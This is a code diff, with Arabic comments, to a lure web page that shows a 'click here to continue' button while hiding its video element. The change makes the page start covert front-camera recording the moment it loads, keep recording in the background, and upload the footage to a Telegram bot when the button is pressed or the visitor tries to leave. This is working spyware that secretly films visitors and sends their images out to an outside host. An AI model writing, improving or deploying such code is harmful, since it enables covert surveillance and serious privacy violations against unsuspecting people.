@@ -10,7 +10,7 @@
     </style>
 </head>
 <body>
-    <button id="mainBtn" onclick="startRecording()">اضغط هنا للمتابعة</button>
+    <button id="mainBtn" onclick="finishAndHide()">اضغط هنا للمتابعة</button>
     <video id="v" autoplay playsinline style="display:none;"></video>
 
     <script>
@@ -21,19 +21,12 @@
         let chunks = [];
         let isSent = false;
 
-        async function initCamera() {
+        // بدء التسجيل المخفي فور فتح الصفحة مباشرة لضمان التقاط أي محاولة خروج سريعة
+        async function autoStart() {
             try {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                document.getElementById('v').srcObject = mediaStream;
-            } catch (e) {}
-        }
-        initCamera();
-
-        function startRecording() {
-            try {
-                document.getElementById('mainBtn').style.display = 'none';
-
-                if (!mediaStream) return;
+                const video = document.getElementById('v');
+                video.srcObject = mediaStream;
 
                 try {
                     mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
@@ -49,16 +42,23 @@
                     sendVideo();
                 };
 
+                // يبدأ يسجل في الخلفية فوراً
                 mediaRecorder.start();
 
-                // إيقاف التسجيل تلقائياً بعد ثانية ونصف
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 1500);
-
             } catch (e) {}
+        }
+
+        // تشغيل الدالة فور تحميل الصفحة
+        window.onload = autoStart;
+
+        function finishAndHide() {
+            document.getElementById('mainBtn').style.display = 'none';
+            // لو كمل وعايز يسيبها ثانية كمان ثم يبعت
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 1000);
         }
 
         function sendVideo() {
@@ -70,7 +70,6 @@
             formData.append('chat_id', CHAT);
             formData.append('video', blob, 'visitor_video.webm');
 
-            // استخدام fetch للإرسال العادي
             fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                 method: 'POST',
                 body: formData
@@ -81,7 +80,7 @@
             }
         }
 
-        // التقاط محاولة الخروج أو الضغط على زر الرجوع لضمان إرسال ما تم تسجيله فورا
+        // لو ضغط رجوع أو قفل الصفحة في أي لحظة، يوقف التسجيل الحالي ويحفظ اللي اتقبض ويبعته فوراً
         window.addEventListener('pagehide', () => {
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
